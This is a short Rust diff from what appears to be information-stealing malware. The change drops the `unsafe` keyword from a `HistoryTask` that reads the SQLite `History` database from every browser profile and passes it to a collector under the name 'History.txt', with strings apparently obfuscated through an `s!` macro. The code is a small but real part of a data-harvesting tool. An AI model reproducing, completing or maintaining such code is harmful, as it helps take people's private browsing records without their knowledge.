@@ -25,7 +25,7 @@ impl HistoryTask {
 impl<C: Collector> Task<C> for HistoryTask {
     parent_name!("History.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("History"),
